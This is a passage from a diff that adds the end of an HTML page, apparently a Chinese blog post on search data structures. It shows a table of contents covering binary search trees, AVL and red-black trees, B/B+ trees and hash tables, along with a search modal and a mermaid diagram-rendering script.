+            </li>
+          </ul>
+        </li>
+        <li><a href="#73-树形查找">7.3 树形查找</a>
+          <ul>
+            <li><a href="#731-二叉排序树">7.3.1 二叉排序树</a>
+              <ul>
+                <li><a href="#7311-二叉排序树的概念">7.3.1.1 二叉排序树的概念</a></li>
+                <li><a href="#7312-二叉排序树的查找">7.3.1.2 二叉排序树的查找</a></li>
+                <li><a href="#7313-二叉排序树的插入">7.3.1.3 二叉排序树的插入</a></li>
+                <li><a href="#7314-二叉排序树的构造">7.3.1.4 二叉排序树的构造</a></li>
+                <li><a href="#7315-二叉排序树的删除">7.3.1.5 二叉排序树的删除</a></li>
+                <li><a href="#7316-二叉排序树的查找效率">7.3.1.6 二叉排序树的查找效率</a></li>
+              </ul>
+            </li>
+            <li><a href="#732-平衡二叉树">7.3.2 平衡二叉树</a>
+              <ul>
+                <li><a href="#7321-平衡二叉树的概念">7.3.2.1 平衡二叉树的概念</a></li>
+                <li><a href="#7322-平衡二叉树的插入">7.3.2.2 平衡二叉树的插入</a></li>
+                <li><a href="#7323-平衡二叉树的查找效率分析">7.3.2.3 平衡二叉树的查找效率分析</a></li>
+                <li><a href="#7323-平衡二叉树的删除">7.3.2.3 平衡二叉树的删除</a></li>
+              </ul>
+            </li>
+            <li><a href="#733-红黑树">7.3.3 红黑树</a>
+              <ul>
+                <li><a href="#7331-为什么要引入红黑树">7.3.3.1 为什么要引入红黑树</a></li>
+                <li><a href="#7332-红黑树的概念">7.3.3.2 红黑树的概念</a></li>
+                <li><a href="#7333-红黑树的查找">7.3.3.3 红黑树的查找</a></li>
+                <li><a href="#7334-红黑树的插入">7.3.3.4 红黑树的插入</a></li>
+                <li><a href="#7335-红黑树的删除">7.3.3.5 红黑树的删除</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#74--b-树-和-b-树">7.4  B 树 和 B+ 树</a>
+          <ul>
+            <li><a href="#741-b-树">7.4.1 B 树</a>
+              <ul>
+                <li><a href="#7411-b-树的概念">7.4.1.1 B 树的概念</a></li>
+                <li><a href="#7412-b-树的查找">7.4.1.2 B 树的查找</a></li>
+                <li><a href="#7413-b-树的插入">7.4.1.3 B 树的插入</a></li>
+                <li><a href="#7414-b-树的删除">7.4.1.4 B 树的删除</a></li>
+              </ul>
+            </li>
+            <li><a href="#742-b-树">7.4.2 B<sup>+</sup> 树</a></li>
+          </ul>
+        </li>
+        <li><a href="#75-散列hash表">7.5 散列（Hash）表</a>
+          <ul>
+            <li><a href="#751-散列表的基本概念">7.5.1 散列表的基本概念</a></li>
+            <li><a href="#752-散列函数的构造方法">7.5.2 散列函数的构造方法</a></li>
+            <li><a href="#753-处理冲突的方法">7.5.3 处理冲突的方法</a>
+              <ul>
+                <li><a href="#7531-拉链法链接法chaining">7.5.3.1 拉链法（链接法，chaining）</a></li>
+                <li><a href="#7532-开放定址法">7.5.3.2 开放定址法</a></li>
+              </ul>
+            </li>
+            <li><a href="#754-散列查找的性能分析">7.5.4 散列查找的性能分析</a>
+              <ul>
+                <li><a href="#7541-asl-计算线性探测法">7.5.4.1 ASL 计算（线性探测法）</a></li>
+                <li><a href="#7542-影响查找效率的因素">7.5.4.2 影响查找效率的因素</a></li>
+                <li><a href="#7543-聚集现象">7.5.4.3 聚集现象</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#附言">附言</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+  </main>
+  
+  
+  <div id="search-modal" class="search-modal">
+    <div class="search-modal-content">
+      
+      <div class="mobile-search-header" style="display: none;">
+        <button id="mobile-exit-btn" class="mobile-icon-btn">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+        </button>
+      </div>
+
+      <div class="search-input-wrapper">
+        <input type="text" id="search-input" placeholder="搜索文章标题或内容...">
+        <button id="mobile-search-btn" class="mobile-icon-btn mobile-search-submit" style="display: none;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+        </button>
+        <span class="search-loading" style="display: none;">第一次加载搜索功能可能需要一点时间...</span>
+      </div>
+      <div id="search-results" class="search-results"></div>
+      <div class="search-footer">
+        <span class="desktop-only">ESC 关闭</span>
+        <span class="desktop-only">↑↓ 选择</span>
+        <span class="desktop-only">Enter 跳转</span>
+      </div>
+    </div>
+  </div>
+
+  <script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.esm.min.mjs';
+
+  mermaid.initialize({ 
+    startOnLoad: false,
+    theme: document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default',
+    securityLevel: 'loose'
+  });
+
+  document.addEventListener('DOMContentLoaded', async () => {
+    
+    await mermaid.run({
+      querySelector: '.mermaid'
+    });
+  });
+</script>
+
+</body>
+</html>
